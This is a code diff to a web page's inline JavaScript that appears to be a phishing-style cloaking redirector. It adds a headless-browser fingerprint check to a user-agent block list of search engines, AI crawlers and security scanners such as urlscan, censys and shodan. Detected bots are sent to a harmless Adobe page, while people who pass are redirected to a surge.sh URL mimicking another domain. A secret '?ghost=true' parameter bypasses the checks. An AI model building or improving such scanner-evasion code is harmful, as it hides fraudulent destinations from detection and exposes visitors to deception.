@@ -14,6 +14,28 @@
         // Target link for verified humans
         const TARGET_URL = 'https://newlearner-com.surge.sh/welearnquick.com';
 
+        // Helper function to wipe HTML content and send bots away
+        // Moved to the top to prevent runtime ReferenceErrors during early conditional calls
+        function blockAccess(msg) {
+            // Default argument fallback in case it is called with no parameters
+            const displayMsg = msg !== undefined ? msg : "";
+            if (document.documentElement) {
+                document.documentElement.innerHTML = `<h1 style="text-align:center; margin-top:20%; font-family:sans-serif;">${displayMsg}</h1>`;
+            }
+            window.location.replace('https://www.adobe.com/uk/learn/acrobat');
+        }
+
+        function isAutomatedBrowser() {
+            if (navigator.webdriver) return true;
+            if (navigator.plugins && navigator.plugins.length === 0) return true;
+            if (!navigator.languages || navigator.languages.length === 0) return true;
+
+            // Catch headless cloud screen dimensions (often exactly 800x600 or 1280x800 default sandboxes)
+            if (window.innerWidth === 800 && window.innerHeight === 600) return true;
+
+            return false;
+        }
+
         // 1. UNIQUE SECRET OVERRIDE (?ghost=true)
         const urlParams = new URLSearchParams(window.location.search);
         if (urlParams.get('ghost') === 'true') {
@@ -31,37 +53,43 @@
 
         // 3. LAYER 1: INSTANTLY BAN WELL-BEHAVED BOTS
         const botList = [
-    // Original list
-    'googlebot', 'bingbot', 'duckduckbot', 'baiduspider', 'yandex',
-    'ia_archiver', 'mj12bot', 'gptbot', 'claude-bot', 'claudebot', 'Slurp',
-    'YandexBot', 'AhrefsBot', 'SemrushBot', 'MJ12Bot', 'ChatGPT-User', 'OAI-SearchBot',
-    'anthropic-ai', 'PerplexityBot', 'censys.io', 'shodan', 'BitSightBot',
+            // Original list
+            'googlebot', 'bingbot', 'duckduckbot', 'baiduspider', 'yandex',
+            'ia_archiver', 'mj12bot', 'gptbot', 'claude-bot', 'claudebot', 'Slurp',
+            'YandexBot', 'AhrefsBot', 'SemrushBot', 'MJ12Bot', 'ChatGPT-User', 'OAI-SearchBot',
+            'anthropic-ai', 'PerplexityBot', 'censys.io', 'shodan', 'BitSightBot',
 
-    // AI & LLM training scrapers
-    'applebot-extended', 'amazonbot', 'cohere-ai', 'metaexternalfetch',
-    'facebookexternalhit', 'perplexitybot', 'youbot', 'oai-searchbot', 'bytespider', 'diffbot',
+            // AI & LLM training scrapers
+            'applebot-extended', 'amazonbot', 'cohere-ai', 'metaexternalfetch',
+            'facebookexternalhit', 'perplexitybot', 'youbot', 'oai-searchbot', 'bytespider', 'diffbot',
 
-    // SEO & Auditing Spiders
-    'ahrefsbot', 'semrushbot', 'splitbee', 'dotbot', 'rogerbot',
-    'screaming frog seo spider', 'siteexplorerbot', 'megaindex', 'spyfu', 'uptimerobot',
+            // SEO & Auditing Spiders
+            'ahrefsbot', 'semrushbot', 'splitbee', 'dotbot', 'rogerbot',
+            'screaming frog seo spider', 'siteexplorerbot', 'megaindex', 'spyfu', 'uptimerobot',
 
-    // Alternative Search Engines
-    'sogou', 'exabot', 'facebot', 'coccocbot', 'qwantify', 'Twitterbot', 'LinkedInBot', 'Slackbot',
-    'Pinterestbot',
+            // Alternative Search Engines
+            'sogou', 'exabot', 'facebot', 'coccocbot', 'qwantify', 'Twitterbot', 'LinkedInBot', 'Slackbot',
+            'Pinterestbot',
 
-    // Programmatic Scraper Libraries
-    'wget', 'curl', 'python-requests', 'go-http-client', 'urlscanbot', 'java', 'axios', 'headlesschrome'
-];
+            // Programmatic Scraper Libraries
+            'wget', 'curl', 'python-requests', 'go-http-client', 'urlscanbot', 'java', 'axios', 'headlesschrome'
+        ];
 
-// Create the dynamic regular expression from the array
-const blockedBots = new RegExp(botList.join('|'), 'i');
+        // Create the dynamic regular expression from the array
+        const blockedBots = new RegExp(botList.join('|'), 'i');
 
-if (blockedBots.test(navigator.userAgent)) {
-    localStorage.setItem('permanently_banned_bot', 'true');
-    blockAccess(".");
-    return;
-}
+        if (blockedBots.test(navigator.userAgent)) {
+            localStorage.setItem('permanently_banned_bot', 'true');
+            blockAccess(".");
+            return;
+        }
 
+        // 4. LAYER 1.5: ADVANCED BROWSER FINGERPRINT CHECK
+        if (isAutomatedBrowser()) {
+            localStorage.setItem('permanently_banned_bot', 'true');
+            blockAccess();
+            return;
+        }
 
         // 4. TRAFFIC LOGGING ENGINE
         const NOW = Date.now();
@@ -91,14 +119,6 @@ if (blockedBots.test(navigator.userAgent)) {
 
         // 7. SUCCESS: ALL CHECKS PASSED ( Human goto)
         window.location.replace(TARGET_URL);
-
-        // Helper function to wipe HTML content and send bots away
-        function blockAccess(msg) {
-            if (document.documentElement) {
-                document.documentElement.innerHTML = `<h1 style="text-align:center; margin-top:20%; font-family:sans-serif;">${msg}</h1>`;
-            }
-            window.location.replace('https://www.adobe.com/uk/learn/acrobat');
-        }
     })();
     </script>
 </head>
